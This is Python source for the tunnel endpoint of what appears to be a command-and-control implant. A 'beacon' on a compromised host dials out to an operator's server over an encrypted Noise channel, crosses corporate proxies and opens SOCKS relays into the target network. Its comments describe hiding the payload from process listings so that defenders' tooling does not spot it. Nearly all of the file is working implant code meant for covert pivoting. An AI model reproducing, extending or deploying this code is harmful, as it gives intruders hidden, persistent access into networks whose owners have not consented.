# How the beacon tells a child it is the tunnel and not another beacon.
#
# An environment variable and not an argument, for two reasons. The child
# is started as `python3 -` with its source on stdin, so there is no
# command line left to carry a flag -- which is the whole point of that
# form, since a quarter of a megabyte of payload in `ps` and
# `/proc/<pid>/cmdline` is how the tooling this derives from was mapped.
# And a variable is not in `ps` output at all, where an argument would be.
#
# The generated config block reads this name rather than repeating the
# string: the parent and the child are the same file, and the two ends of
# an agreement written twice are the two ends that drift.
_TUNNEL_MODE_ENV = "RACCOON_TUNNEL_MODE"

# Where the endpoint's PSK comes from on a host configured by file rather
# than by a generated config block.
#
# Not from `configs/raccoon.yaml`, following `RACCOON_LISTENER_TOKEN`: that
# file is in git, and under `NKpsk0` this value plus the server's public
# key is the whole credential. `tunnel_config_from_yaml` refuses a `psk`
# key in the file and names this variable instead;
# `services/raccoon-tunnel.service` supplies it through an
# `EnvironmentFile`, which unlike a unit file is not world-readable.
_TUNNEL_PSK_ENV = "RACCOON_TUNNEL_PSK"

# How long a terminated tunnel child is given to go before it is killed.
# A child blocked in an uninterruptible syscall is exactly the pathology
# running the endpoint in its own process exists to contain, so the wait
# is bounded and the second signal is not negotiable.
_TUNNEL_CHILD_STOP_TIMEOUT = 5.0

# How long the child is given to read the source off its stdin. The
# interpreter drains stdin to EOF before it compiles a line, so a few
# hundred kilobytes is milliseconds and this bound is never reached on
# the real path. It exists because the pipe buffer is around 64 KB and a
# child that reads nothing -- `sys.executable` pointing at an embedded
# interpreter or a frozen host application rather than at python -- would
# otherwise block the beacon's own thread for ever in the write. The
# beacon is the access and the tunnel is the convenience; the convenience
# does not get to hang the access.
_TUNNEL_SOURCE_TIMEOUT = 30.0

# Which RFC 1928 reply code each failure to reach a target becomes.
# Explicit, because an operator's tool prints this code directly and a
# wrong one sends somebody debugging the wrong layer: `0x05` has them
# looking at the service, `0x03` at the route. Anything unmapped is
# `REPLY_GENERAL_FAILURE`, which says only that it did not work.
_SOCKS_REPLY_FOR_ERRNO = {
    errno.ECONNREFUSED: REPLY_CONNECTION_REFUSED,
    # An RST in answer to a SYN is what a refusal is.
    errno.ECONNRESET: REPLY_CONNECTION_REFUSED,
    errno.ENETUNREACH: REPLY_NETWORK_UNREACHABLE,
    errno.ENETDOWN: REPLY_NETWORK_UNREACHABLE,
    errno.ENETRESET: REPLY_NETWORK_UNREACHABLE,
    errno.EHOSTUNREACH: REPLY_HOST_UNREACHABLE,
    errno.EHOSTDOWN: REPLY_HOST_UNREACHABLE,
    errno.ETIMEDOUT: REPLY_TTL_EXPIRED,
    # A local policy refusal -- a sandbox, an SELinux rule -- rather than
    # anything the target did.
    errno.EACCES: REPLY_NOT_ALLOWED,
    errno.EPERM: REPLY_NOT_ALLOWED,
    # No stack for the family the operator asked for, which is the one
    # failure that is about the address type and not the address.
    errno.EAFNOSUPPORT: REPLY_ADDRESS_TYPE_NOT_SUPPORTED,
}


def _socks_reply_for_error(exc: BaseException) -> int:
    """The RFC 1928 reply code for one failure to reach a target.

    `socket.timeout` is checked first because it is an `OSError` whose
    `errno` is `None`, and `socket.gaierror` before the table because its
    `errno` is an `EAI_*` code that collides numerically with the `errno`
    values -- `EAI_NONAME` is 8 on this platform, which the table would
    otherwise read as `ENOEXEC`. A name that does not resolve has no code
    of its own in RFC 1928; host unreachable is the closest, and it is
    what stops an operator blaming the tunnel for a typo.
    """
    if isinstance(exc, socket.timeout):
        return REPLY_TTL_EXPIRED
    if isinstance(exc, socket.gaierror):
        return REPLY_HOST_UNREACHABLE
    return _SOCKS_REPLY_FOR_ERRNO.get(getattr(exc, "errno", None),
                                      REPLY_GENERAL_FAILURE)


def _bound_socks_address(sock: socket.socket) -> Tuple[int, str, int]:
    """`(atyp, address, port)` for RFC 1928 §6's BND.ADDR and BND.PORT.

    The endpoint's own outgoing socket, because that is what the field
    means and because an operator diagnosing a route wants to see which
    interface the connection actually left by, not a canned zero. A
    scoped IPv6 address -- `fe80::1%en0`, which `inet_pton` will not
    take -- falls back to the unspecified address: the bound address is
    informational and a reply that cannot be encoded would cost the
    session.
    """
    try:
        local = sock.getsockname()
        atyp = (ATYP_IPV6 if sock.family == socket.AF_INET6 else ATYP_IPV4)
        address, port = str(local[0]), int(local[1])
        # Encoded and discarded, purely to find out whether it can be.
        _encode_socks_address(atyp, address)
        return atyp, address, port
    except (OSError, ValueError, IndexError, TypeError):
        return ATYP_IPV4, "0.0.0.0", 0


def _bytes_waiting(sock: socket.socket) -> bool:
    """True if a byte is waiting; False on an orderly close.

    `read_frame` reports a clean EOF between frames and a peer that
    vanished mid-frame with the same `ValueError`, so the difference is
    only in the message text. One `MSG_PEEK` moves it into the socket API
    instead: `b""` is a FIN with nothing behind it, a `socket.timeout`
    propagates as a peer that went quiet, and anything else means there
    are bytes in hand -- so a `ValueError` from the `read_frame` that
    follows is a malformed frame and cannot be an orderly teardown.
    """
    return bool(sock.recv(1, socket.MSG_PEEK))


def _shutdown_socket(sock: socket.socket) -> None:
    """Shut a socket down both ways without closing it.

    Without closing, because another thread may still be inside a `recv`
    or a `sendall` on this descriptor: the shutdown is what unparks it,
    and closing the descriptor is left to the one frame that knows every
    thread using it has finished.
    """
    try:
        sock.shutdown(socket.SHUT_RDWR)
    except OSError:
        pass


def _shut_socket(sock: socket.socket) -> None:
    """Drop a socket now, waiting for nothing and raising nothing."""
    _shutdown_socket(sock)
    try:
        sock.close()
    except OSError:
        pass


def _proxy_read_line(sock: socket.socket) -> str:
    """One CRLF-terminated line from a proxy, read a byte at a time.

    A byte at a time because what follows the blank line is a Noise frame
    and must not be read into a buffer this function drops. Bounded at
    `_PROXY_MAX_LINE`, as `_NtlmProxyRelay` bounds its own reads.
    """
    chunks = []
    while len(chunks) < _PROXY_MAX_LINE:
        byte = sock.recv(1)
        if not byte:
            break
        if byte == b"\n":
            break
        if byte != b"\r":
            chunks.append(byte)
    return b"".join(chunks).decode("latin-1")


def _proxy_endpoint(url) -> Optional[Tuple[str, int]]:
    """`(host, port)` of an HTTP proxy URL, or None if it is not one.

    Parsed here rather than handed to urllib because this is also where a
    `socks5://` scheme and a PAC URL are rejected: neither is something a
    `CONNECT` can be written to, and a tunnel that tried would spend a
    whole backoff on a proxy that was never going to answer. Any userinfo
    is dropped -- credentials in a URL are urllib's mechanism, and
    `_NtlmProxyRelay` is this one's path for a proxy that authenticates.
    """
    text = str(url or "").strip()
    if not text:
        return None
    scheme, separator, rest = text.partition("://")
    if separator and scheme.lower() not in ("http", "https"):
        return None
    if not separator:
        scheme, rest = "http", text
    authority = rest.split("/", 1)[0]
    if "@" in authority:
        authority = authority.rsplit("@", 1)[1]
    host, colon, port_text = authority.rpartition(":")
    if not colon:
        host, port_text = authority, ("443" if scheme.lower() == "https"
                                      else "80")
    # A bracketed IPv6 literal, which is how a URL has to write one.
    host = host.strip("[]")
    try:
        port = int(port_text)
    except ValueError:
        return None
    if not host or not 1 <= port <= 0xFFFF:
        return None
    return host, port


def _route_name(route) -> str:
    """How one way out is named in a log line or an error."""
    return "direct" if route is None else "proxy %s:%d" % route


def _tunnel_seconds(value, default: float) -> float:
    """A positive number of seconds from a config field, or `default`."""
    try:
        seconds = float(value)
    except (TypeError, ValueError):
        return default
    return seconds if seconds > 0 else default


def _tunnel_key(value, field: str, what: str) -> bytes:
    """The 32 bytes `value` base64-encodes, or a ValueError naming `field`.

    The messages name the field and the problem and never the value or
    any part of it, following `decode_key`: one of these fields is a PSK,
    which under `NKpsk0` is the whole credential, and an error message is
    the easiest place in a program for a secret to end up. Raised outside
    the except block so the decoder's own error cannot ride along in the
    chain.
    """
    text = value.strip() if isinstance(value, str) else ""
    problem = None
    raw = b""
    if not text:
        problem = ("%s is required: it is %s, %d bytes base64-encoded"
                   % (field, what, _NOISE_KEY_LEN))
    else:
        try:
            # binascii.Error is a ValueError.
            raw = base64.b64decode(text, validate=True)
        except ValueError:
            problem = ("%s is not valid base64: it is %s, %d bytes "
                       "base64-encoded" % (field, what, _NOISE_KEY_LEN))
        else:
            if len(raw) != _NOISE_KEY_LEN:
                problem = ("%s decodes to %d bytes: it is %s, and that is "
                           "exactly %d bytes"
                           % (field, len(raw), what, _NOISE_KEY_LEN))
    if problem:
        raise ValueError(problem)
    return raw


def tunnel_config_problem(config) -> Optional[str]:
    """Why this config cannot run a tunnel endpoint, or None.

    The shape of `beacon_key_problem`: a string naming what is wrong, or
    None. Asked where the config is loaded, so a build whose tunnel block
    is half-filled stops with a reason instead of retrying a connection it
    can never make.

    A tunnel that is absent or disabled is not a problem. Most builds have
    no tunnel, and demanding a PSK of those would break them.
    """
    c2 = config.get("c2") if isinstance(config, dict) else None
    tunnel = c2.get("tunnel") if isinstance(c2, dict) else None
    if not isinstance(tunnel, dict) or not tunnel.get("enabled"):
        return None
    server = tunnel.get("server")
    if not isinstance(server, str) or not server.strip():
        return ("c2.tunnel.server is required: it is the host the endpoint "
                "dials out to, written as the target's network can reach it")
    identity = tunnel.get("identity")
    if not isinstance(identity, str) or not identity.strip():
        return ("c2.tunnel.identity is required: it is the build this PSK "
                "belongs to, and the server refuses a HELLO that claims "
                "another one")
    port = tunnel.get("port")
    if (isinstance(port, bool) or not isinstance(port, int)
            or not 1 <= port <= 0xFFFF):
        return ("c2.tunnel.port must be a port between 1 and 65535: it is "
                "the single port that serves the command channel and every "
                "relay, so that one CONNECT rule is enough to cross a proxy")
    try:
        _tunnel_key(tunnel.get("public_key"), "c2.tunnel.public_key",
                    "the tunnel server's static X25519 public key")
        _tunnel_key(tunnel.get("psk"), "c2.tunnel.psk",
                    "this build's pre-shared key")
    except ValueError as exc:
        return str(exc)
    return None


def tunnel_mode_problem(config) -> Optional[str]:
    """Why this config cannot be *run* as a tunnel endpoint, or None.

    The question `tunnel_config_problem` asks the other way round. That
    one answers None for a config with no tunnel, because most builds
    have none and demanding a PSK of those would break them. Here
    something has been asked to *be* the endpoint -- the child started by
    `Beacon._exec_tunnel`, or the parent about to start it -- so an
    absent, non-dict or disabled block is the problem rather than the
    ordinary case.

    One predicate for both ends on purpose. The parent refuses before it
    spawns, so the operator gets the diagnosis instead of a bare exit
    code; the child refuses in its bootstrap, because a build can be
    launched by hand or by a systemd unit with no parent to have checked.
    Two spellings of the same rule would be the parent and the child
    disagreeing about whether a build has a tunnel.
    """
    c2 = config.get("c2") if isinstance(config, dict) else None
    tunnel = c2.get("tunnel") if isinstance(c2, dict) else None
    if not isinstance(tunnel, dict) or not tunnel.get("enabled"):
        return ("this build carries no enabled c2.tunnel block: there is "
                "no server, port, public_key or psk to dial with, so it "
                "cannot run the tunnel endpoint. Generate the build with "
                "the tunnel enabled.")
    return tunnel_config_problem(config)


class _TunnelChannel(object):
    """The endpoint's command channel: its socket, Noise session and lock.

    Writes take the lock, and the lock covers `encrypt` as well as the
    bytes. Two threads write here -- the command loop answering a PING
    with a PONG, and the keep-alive thread sending one of its own -- and
    `write_frame`'s single `sendall` does not serialise them: it loops
    over partial sends and releases the GIL. The nonce `encrypt` advances
    has to be ordered with the frame it produced, so both are inside.
    """

    def __init__(self, sock: socket.socket, noise: NoiseSession):
        self.sock = sock
        self.noise = noise
        self.last_seen = time.monotonic()
        self.last_ping = self.last_seen
        self._write_lock = threading.Lock()
        # A lock of its own for the closed flag, held across nothing. The
        # write lock cannot serve: `send` holds that one across a blocking
        # `sendall`, and `close` has to be able to run then.
        self._state_lock = threading.Lock()
        self._closed = False

    def send(self, kind: int, body: dict) -> None:
        """One command message, under the lock that orders the nonce too."""
        with self._write_lock:
            if self._closed:
                raise OSError("this command channel is closed")
            write_frame(self.sock,
                        self.noise.encrypt(encode_message(kind, body)))

    def touch(self) -> None:
        self.last_seen = time.monotonic()

    @property
    def closed(self) -> bool:
        return self._closed

    def close(self) -> None:
        """Shut the channel down. Never waits on a write in flight."""
        with self._state_lock:
            if self._closed:
                return
            self._closed = True
        _shut_socket(self.sock)


class TunnelEndpoint(object):
    """The far end of the tunnel: one command channel, one relay per request.

    `config` is a beacon config and the block read is `c2.tunnel`, which
    carries `server`, `port`, `public_key`, `psk`, `identity` and
    optionally `keepalive_seconds`, `connect_timeout_seconds`,
    `implant_id` and `allow_slow_crypto`. A config this class cannot run
    is a `ValueError` naming the field, from `tunnel_config_problem`.
    `c2.proxy` is read too, and it is the same block the beacon's own
    transports use: one host has one way out.

    `run()` blocks until `stop()`, reconnecting on the beacon's backoff;
    `status()` is a row for an operator panel.
    """

    def __init__(self, config: dict):
        problem = tunnel_config_problem(config)
        if problem:
            raise ValueError(problem)
        c2 = config.get("c2") if isinstance(config, dict) else None
        tunnel = c2.get("tunnel") if isinstance(c2, dict) else None
        if not isinstance(tunnel, dict) or not tunnel.get("enabled"):
            raise ValueError(
                "c2.tunnel.enabled is not set: this config asks for no "
                "tunnel, and an endpoint with nothing to dial is not one")
        self.server = tunnel["server"].strip()
        self.port = int(tunnel["port"])
        self.identity = tunnel["identity"].strip()
        self._public = _tunnel_key(tunnel.get("public_key"),
                                   "c2.tunnel.public_key",
                                   "the tunnel server's static X25519 "
                                   "public key")
        self._psk = _tunnel_key(tunnel.get("psk"), "c2.tunnel.psk",
                                "this build's pre-shared key")
        implant_id = tunnel.get("implant_id")
        self.implant_id = (implant_id.strip()
                           if isinstance(implant_id, str) else "")
        self.keepalive_interval = _tunnel_seconds(
            tunnel.get("keepalive_seconds"), _DEFAULT_KEEPALIVE)
        # Three keep-alives missed before the server is declared gone,
        # which is the rule the server applies to this end: one lost PING
        # on a bad link should not cost a tunnel.
        self.idle_timeout = 3 * self.keepalive_interval
        self.connect_timeout = _tunnel_seconds(
            tunnel.get("connect_timeout_seconds"), _DEFAULT_CONNECT_TIMEOUT)
        self.allow_slow_crypto = bool(tunnel.get("allow_slow_crypto"))

        proxy = c2.get("proxy")
        proxy = proxy if isinstance(proxy, dict) else {}
        self.proxy_mode = str(proxy.get("mode") or "auto")
        self.proxy_url = str(proxy.get("url") or "")
        ntlm = proxy.get("ntlm")
        self._proxy_ntlm = ntlm if isinstance(ntlm, dict) else {}

        self._lock = threading.Lock()
        # Write-once: `run` never clears it. A `stop` that lands before
        # `run` -- including the whole window between a caller's
        # `thread.start()` and `run`'s first line, which is milliseconds
        # under load -- has to be the one that wins, and a flag `run`
        # could clear would erase it and leave the reconnect loop running
        # for ever. So one `TunnelEndpoint` is one `run`: the keep-alive
        # and both relay directions read this same event, and supporting
        # a restart would mean threading a generation number through all
        # of them for a caller nothing has asked for. Task 8 constructs a
        # fresh endpoint per child, which is the shape that wants.
        self._stop = threading.Event()
        self._channel = None        # type: Optional[_TunnelChannel]
        self._connected = False
        self._failures = 0
        # The way out that worked, so a relay does not re-walk the list.
        # `None` is a valid route -- direct -- so "not known yet" needs a
        # flag of its own rather than a sentinel value.
        self._route = None
        self._route_known = False
        self._discovered = None     # type: Optional[list]
        self._ntlm_relay = None     # type: Optional[_NtlmProxyRelay]
        # Every socket a relay holds, so `stop` can unpark a pump instead
        # of waiting for one to notice.
        self._relay_sockets = set()
        self._relay_threads = []    # type: list
        self._sessions = 0
        self._carried = 0

    # ── lifecycle ──

    def run(self) -> None:
        """Hold a command channel open, reconnecting until `stop`. Blocks.

        Called once per instance: a `stop` is final, because the flag it
        sets is also what the keep-alive and both relay directions watch.

        Refuses to start on the pure-Python cipher unless told otherwise.
        Pure-Python AES-GCM moves roughly 50-200 KB/s, which is fine for
        the small messages the rest of this file sends and useless for a
        tunnel -- and "it is slow" would otherwise be diagnosed for hours
        as a network fault, because every other sign is of a working
        tunnel. The override exists because a tunnel at 100 KB/s still
        beats no tunnel when that is the decision an operator wants to
        make.
        """
        if _USE_PURE_PYTHON_AES and not self.allow_slow_crypto:
            raise RuntimeError(
                "this host has no libcrypto, so AES-256-GCM runs in pure "
                "Python at roughly 50-200 KB/s. That is enough for the "
                "beacon's own messages and not for a tunnel: every session "
                "would look like a slow network for as long as anybody "
                "cared to look. Install OpenSSL, or set "
                "c2.tunnel.allow_slow_crypto to run on the slow path "
                "deliberately.")
        if self._stop.is_set():
            # A `stop` that landed before this line, which is a caller
            # that changed its mind during thread start-up. It wins: the
            # flag is write-once and this returns without dialling.
            logger.info("tunnel: endpoint %r was stopped before it started",
                        self.identity)
            return
        logger.info("tunnel: endpoint %r dialling %s:%d, crypto %s",
                    self.identity, self.server, self.port,
                    self._crypto_path())
        while not self._stop.is_set():
            try:
                self._control_session()
            except (OSError, ValueError) as exc:
                # Everything a dead server, a proxy that stopped answering
                # or a refused handshake can cause arrives here, and the
                # answer to all of it is the same: wait, and dial again.
                logger.info("tunnel: the command channel to %s:%d did not "
                            "last: %s", self.server, self.port, exc)
            except Exception:
                # This loop is the whole endpoint: an exception that got
                # out would be a tunnel that silently stopped existing.
                logger.exception("tunnel: unexpected error on the command "
                                 "channel")
            self._failures += 1
            if self._stop.is_set():
                break
            self._retry_sleep()
        logger.info("tunnel: endpoint %r stopped", self.identity)

    def stop(self) -> None:
        """Stop reconnecting and drop everything. Safe before `run`, twice.

        Final, and before `run` as well as during it: the flag is never
        cleared, so a `stop` that arrives while a caller is still getting
        `run` onto a thread makes that `run` return without dialling,
        rather than being erased by it.

        Every socket is shut down rather than only closed: a pump parked
        in a read, or in a send that TCP backpressure has stopped, does
        not wake on a bare close on every platform, and this must not wait
        for one to notice on its own.
        """
        self._stop.set()
        with self._lock:
            channel = self._channel
            # Cleared here and not left to the command loop's own
            # unwinding: `stop` has just closed the channel, so a
            # `status` read immediately afterwards would otherwise report
            # an endpoint that is connected to a socket it no longer has.
            # The command loop clears it again on its way out, which is
            # idempotent.
            self._connected = False
            self._channel = None
            sockets = list(self._relay_sockets)
            threads = list(self._relay_threads)
            relay, self._ntlm_relay = self._ntlm_relay, None
            self._relay_sockets = set()
            self._relay_threads = []
        if channel is not None:
            channel.close()
        for sock in sockets:
            # Shut down and not closed: the relay thread that owns each of
            # these is the one that closes it.
            _shutdown_socket(sock)
        for thread in threads:
            thread.join(timeout=_TUNNEL_JOIN_TIMEOUT)
        if relay is not None:
            relay.stop()

    def status(self) -> dict:
        """One row's worth of what this endpoint is doing.

        `crypto` is read through the module rather than copied at
        construction, because it is what an operator checks when a tunnel
        is inexplicably slow and it has to be the truth now. `egress` is
        `None` until something has connected, because until then which way
        out works is not known rather than direct.

        `sessions` is what is open now and `carried` is everything since
        this endpoint started: the first drops back to zero when a relay
        closes, and a row that reported only that would tell an operator
        nothing had ever gone through an endpoint that had just carried a
        scan.
        """
        egress = self._egress()
        with self._lock:
            connected = self._connected
            sessions = self._sessions
            carried = self._carried
        return {
            "identity": self.identity,
            "server": self.server,
            "port": self.port,
            "connected": connected,
            "sessions": sessions,
            "carried": carried,
            "egress": egress,
            "crypto": self._crypto_path(),
            "slow_crypto_allowed": self.allow_slow_crypto,
        }

    # ── the command channel ──

    def _control_session(self) -> None:
        """One command channel, from the handshake to its last frame."""
        sock = self._dial(self.port)
        channel = None
        keeper = None
        try:
            noise = self._handshake(
                sock, encode_message(MSG_HELLO, self._hello()))
            channel = _TunnelChannel(sock, noise)
            with self._lock:
                self._channel = channel
                self._connected = True
                # Reset here and not on the dial: a connection that
                # authenticated is what proves the way out works, and a
                # TCP connect that is accepted and then refused would
                # otherwise reset the backoff on every attempt.
                self._failures = 0
            logger.info("tunnel: endpoint %r registered with %s:%d over %s",
                        self.identity, self.server, self.port, self._egress())
            keeper = threading.Thread(target=self._keepalive_loop,
                                      args=(channel,), name="tunnel-keepalive",
                                      daemon=True)
            try:
                keeper.start()
            except RuntimeError as exc:
                # The process has no more threads to give. Not fatal: the
                # server pings this end too and a PONG is answered from
                # the loop below, so the channel survives without a
                # keep-alive of its own -- it just takes the server's
                # idle timeout rather than ours to notice a dead link.
                keeper = None
                logger.warning("tunnel: no thread for the keep-alive (%s); "
                               "relying on the server's", exc)
            self._control_loop(channel)
        finally:
            with self._lock:
                self._connected = False
                self._channel = None
            if channel is not None:
                channel.close()
            else:
                _shut_socket(sock)
            if keeper is not None:
                keeper.join(timeout=_TUNNEL_JOIN_TIMEOUT)

    def _hello(self) -> dict:
        """The HELLO body: which build this is, and what host it is on.

        `identity` is asserted as well as proved, because the server
        refuses a connection whose HELLO disagrees with the PSK that
        authenticated it: a build free to claim another's identity would
        be a SOCKS port pointing at a different network than the operator
        believes. `implant_id` is sent only when the config carries one --
        an endpoint started from systemd has no beacon above it, and the
        server reports that as unlinked rather than hiding the row.
        """
        body = {"identity": self.identity,
                "hostname": platform.node(),
                "os": "%s %s" % (platform.system(), platform.release())}
        if self.implant_id:
            body["implant_id"] = self.implant_id
        return body

    def _control_loop(self, channel: _TunnelChannel) -> None:
        """Read and act on command messages until the channel ends."""
        sock = channel.sock
        # A poll, not the idle timeout: the deadline is measured against
        # `last_seen` below so that `stop` does not have to wait one out.
        poll = min(_CONTROL_POLL, self.keepalive_interval)
        sock.settimeout(poll)
        while not self._stop.is_set():
            try:
                waiting = _bytes_waiting(sock)
            except socket.timeout:
                if time.monotonic() - channel.last_seen < self.idle_timeout:
                    continue
                # Not an error and not a malformed peer: nothing has
                # arrived for three keep-alives, so the server is gone.
                logger.info("tunnel: %s:%d went quiet for %.1fs; dialling "
                            "again", self.server, self.port, self.idle_timeout)
                return
            except OSError as exc:
                logger.debug("tunnel: the command channel ended: %s", exc)
                return
            if not waiting:
                # A FIN between frames: an orderly teardown, and the only
                # way to tell it from a truncated frame, which `read_frame`
                # reports with the same exception type.
                logger.info("tunnel: %s:%d closed the command channel",
                            self.server, self.port)
                return
            try:
                frame = read_frame(sock)
            except socket.timeout:
                # Bytes arrived and then stopped mid-frame. Bounded by the
                # poll above, and dropped rather than waited on.
                logger.debug("tunnel: %s:%d stalled mid-frame",
                             self.server, self.port)
                return
            except OSError as exc:
                logger.debug("tunnel: the command channel ended: %s", exc)
                return
            except ValueError as exc:
                # Reached only with bytes in hand, so this is a frame that
                # was wrong rather than a peer that left.
                logger.warning("tunnel: a malformed frame from %s:%d: %s",
                               self.server, self.port, exc)
                return
            try:
                payload = channel.noise.decrypt(frame)
            except ValueError as exc:
                # Noise §5.1: abandon the session after a decrypt failure.
                # `NoiseSession` leaves that policy to its caller, which is
                # here, so the connection goes.
                logger.warning("tunnel: a frame from %s:%d did not "
                               "authenticate (%s); dropping the channel",
                               self.server, self.port, exc)
                return
            try:
                kind, body = decode_message(payload)
            except ValueError as exc:
                logger.warning("tunnel: an undecodable message from %s:%d: "
                               "%s", self.server, self.port, exc)
                return
            channel.touch()
            if kind == MSG_OPEN_RELAY:
                self._spawn_relay(body)
            elif kind == MSG_PING:
                try:
                    channel.send(MSG_PONG, {})
                except (OSError, ValueError) as exc:
                    logger.debug("tunnel: could not answer a PING: %s", exc)
                    return
            elif kind == MSG_PONG:
                continue
            elif kind == MSG_CLOSE:
                logger.info("tunnel: %s:%d asked to close the command "
                            "channel", self.server, self.port)
                return
            else:
                # HELLO and RELAY both mean the far end has lost track of
                # which direction it is talking in.
                logger.warning("tunnel: %s:%d sent %s on an established "
                               "channel", self.server, self.port,
                               MESSAGE_KIND_NAMES.get(kind, kind))
                return

    def _keepalive_loop(self, channel: _TunnelChannel) -> None:
        """Send a PING when nothing has arrived for a keep-alive interval.

        The server pings too, and either side's PING is answered with a
        PONG by the other, so one interval of silence in either direction
        is enough to find a connection that has died without a FIN -- a
        proxy that recycled an idle tunnel, a NAT that dropped the
        mapping. A thread of its own rather than the command loop's poll,
        so a slow frame cannot delay the clock, and it is why
        `_TunnelChannel.send` holds a lock.
        """
        tick = max(_KEEPALIVE_TICK_FLOOR,
                   min(_KEEPALIVE_TICK_CEILING, self.keepalive_interval / 2.0))
        try:
            while not self._stop.wait(tick):
                if channel.closed:
                    return
                now = time.monotonic()
                if (now - channel.last_seen < self.keepalive_interval
                        or now - channel.last_ping < self.keepalive_interval):
                    continue
                channel.last_ping = now
                try:
                    channel.send(MSG_PING, {})
                except (OSError, ValueError) as exc:
                    # The command loop owns the reconnect; closing the
                    # socket is what tells it to let go.
                    logger.debug("tunnel: keep-alive failed: %s", exc)
                    channel.close()
                    return
        except Exception:
            logger.exception("tunnel: unexpected error in the keep-alive")
            channel.close()

    def _retry_sleep(self) -> None:
        """Wait before dialling again, on the beacon's own backoff shape.

        `_stop.wait` rather than `time.sleep`, so a `stop` does not have
        to sit out a delay that reaches five minutes.
        """
        delay = min(_TUNNEL_RETRY_BASE * (1.5 ** self._failures),
                    _TUNNEL_RETRY_CEILING)
        delay += random.uniform(0, delay * 0.2)
        logger.debug("tunnel: next attempt in %.1fs (failures=%d)",
                     delay, self._failures)
        self._stop.wait(delay)

    # ── relays ──

    def _spawn_relay(self, body: dict) -> None:
        """Dial the relay the server has just asked for, on its own thread."""
        token = body.get("token")
        port = body.get("port")
        if not isinstance(token, str) or not token:
            logger.warning("tunnel: an OPEN_RELAY carrying no token; ignored")
            return
        if (isinstance(port, bool) or not isinstance(port, int)
                or not 1 <= port <= 0xFFFF):
            # Including zero, which on the protocol this derives from was
            # a keep-alive rather than a destination. This one keeps its
            # keep-alive in PING/PONG and has no use for a port that is
            # not one.
            logger.warning("tunnel: an OPEN_RELAY naming %r, which is not a "
                           "port; ignored", port)
            return
        thread = threading.Thread(target=self._relay, args=(port, token),
                                  name="tunnel-relay", daemon=True)
        with self._lock:
            self._relay_threads = [t for t in self._relay_threads
                                   if t.is_alive()]
            self._relay_threads.append(thread)
        try:
            thread.start()
        except RuntimeError as exc:
            # The process has no more threads to give. The operator's end
            # is told by the session never pairing, which is what it is
            # already waiting on.
            with self._lock:
                if thread in self._relay_threads:
                    self._relay_threads.remove(thread)
            logger.warning("tunnel: no thread could be started for a relay: "
                           "%s", exc)

    def _relay(self, port: int, token: str) -> None:
        """One relay: dial the same port, claim it with the token, serve it."""
        sock = None
        try:
            sock = self._dial(port)
            self._register_socket(sock)
            noise = self._handshake(
                sock, encode_message(MSG_RELAY, {"token": token}))
            self._serve_relay(sock, noise)
        except (OSError, ValueError) as exc:
            # A relay that could not be dialled, a token the server no
            # longer holds, a frame that did not authenticate, a session
            # the operator closed: all of it costs this one relay, and the
            # operator's end learns of it from the session never pairing
            # or from the stream ending.
            logger.info("tunnel: a relay to %s:%d ended: %s",
                        self.server, port, exc)
        except Exception:
            logger.exception("tunnel: unexpected error on a relay")
        finally:
            if sock is not None:
                self._forget_socket(sock)
                _shut_socket(sock)

    def _serve_relay(self, sock: socket.socket, noise: NoiseSession) -> None:
        """Read the one SOCKS request this relay carries, and answer it.

        No `_bytes_waiting` peek here, unlike the command loop: at this
        point in the protocol the operator's end owes exactly one request,
        so an orderly FIN and a truncated frame mean the same thing -- the
        session is over before it began -- and both end this relay. The
        distinction is only worth making where it changes what is done.
        """
        sock.settimeout(self.connect_timeout)
        # A ValueError from either call is a frame that did not
        # authenticate or a request that was not one; the caller closes
        # the connection over it, which is Noise §5.1 where the policy
        # was deferred to.
        cmd, atyp, address, port = decode_socks_request(
            noise.decrypt(read_frame(sock)))
        # The request's own address type is not acted on: the codec is the
        # authority on it and refuses one it does not know, and the type
        # in the reply is the family of the socket actually opened, which
        # is not always the family that was asked for -- a name can
        # resolve to either.
        target = "%s:%d" % (address, port)
        logger.debug("tunnel: a relay asked for %s to %s (%s)",
                     SOCKS_COMMAND_NAMES.get(cmd, cmd), target,
                     SOCKS_ADDRESS_TYPE_NAMES.get(atyp, atyp))
        if not socks_command_supported(cmd):
            # BIND and UDP ASSOCIATE decode so that they can be refused
            # properly: at the operator's end a parse error is
            # indistinguishable from a dead tunnel.
            logger.info("tunnel: the operator asked for %s to %s, which an "
                        "endpoint does not serve",
                        SOCKS_COMMAND_NAMES.get(cmd, cmd), target)
            self._reply(sock, noise, REPLY_COMMAND_NOT_SUPPORTED)
            return
        try:
            peer = self._dial_target(address, port, self.connect_timeout)
        except (OSError, ValueError) as exc:
            reply = _socks_reply_for_error(exc)
            logger.info("tunnel: could not reach %s (%s); answering %s",
                        target, exc, SOCKS_REPLY_NAMES.get(reply, reply))
            self._reply(sock, noise, reply)
            return
        self._register_socket(peer)
        try:
            atyp_out, bound, bound_port = _bound_socks_address(peer)
            # The reply is a frame of its own and carries nothing else.
            # The operator's end reads it with one `recv_message` and
            # refuses a frame that is not exactly a reply, so a target
            # that speaks first -- and most do -- must not have its first
            # bytes coalesced into this one.
            self._reply(sock, noise, REPLY_SUCCEEDED, atyp_out, bound,
                        bound_port)
            self._count_session(1)
            try:
                logger.info("tunnel: carrying %s", target)
                self._bridge(sock, noise, peer)
            finally:
                self._count_session(-1)
        finally:
            self._forget_socket(peer)
            _shut_socket(peer)

    def _reply(self, sock: socket.socket, noise: NoiseSession, reply: int,
               atyp: int = ATYP_IPV4, address: str = "0.0.0.0",
               port: int = 0) -> None:
        """One SOCKS reply, as its own frame."""
        write_frame(sock,
                    noise.encrypt(encode_socks_reply(reply, atyp, address,
                                                     port)))

    def _dial_target(self, address: str, port: int,
                     timeout: float) -> socket.socket:
        """One TCP connection into the network this endpoint sits in.

        The single place this class touches the target network, which is
        also what makes it the one seam a test can stand in for a
        condition a host cannot be made to produce on demand.
        `create_connection` resolves a name and tries every address it is
        given, which is what makes `ATYP=3` work and what reaches an IPv6
        target wherever the host has a route to one.
        """
        return socket.create_connection((address, port), timeout=timeout)

    def _bridge(self, relay: socket.socket, noise: NoiseSession,
                peer: socket.socket) -> None:
        """Carry bytes until either side is finished.

        Neither descriptor has a timeout here. An idle session is an
        ordinary thing -- a target that speaks first, an operator's shell
        waiting on a prompt -- and `stop` unparks both directions by
        shutting their descriptors down instead.

        Each socket has exactly one writer, which is why neither direction
        needs the lock the command channel has. This thread wrote the
        reply and then carries the target's bytes to the relay, so it is
        the only writer on the relay socket; the thread started here is
        the only writer on the target socket. No reply is ever sent after
        this point, which is what makes that hold.
        """
        relay.settimeout(None)
        peer.settimeout(None)
